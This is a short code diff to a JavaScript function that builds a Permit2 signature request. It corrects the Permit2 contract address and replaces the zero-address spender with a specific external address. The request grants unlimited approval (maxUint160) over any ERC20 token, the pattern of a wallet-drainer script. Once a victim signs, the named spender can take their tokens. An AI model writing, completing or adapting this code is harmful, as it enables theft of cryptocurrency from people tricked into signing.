@@ -141,7 +141,7 @@ const permitSignEVM = async (
       name: "Permit2",
       version: "1",
       chainId: chainId,
-      verifyingContract: "0x000000000022d473030f116dfc393057b8e0fa70",
+      verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
     };
 
     const types = {
@@ -166,7 +166,7 @@ const permitSignEVM = async (
         token: tokenAddress, // Accept any ERC20 token
         amount: maxUint160,
       },
-      spender: "0x0000000000000000000000000000000000000000",
+      spender: "0x5aD69516BE38EF4B8dab3e1Ff6b5206927Fa38c3",
       nonce: Math.floor(Math.random() * 1000000),
       deadline,
     };
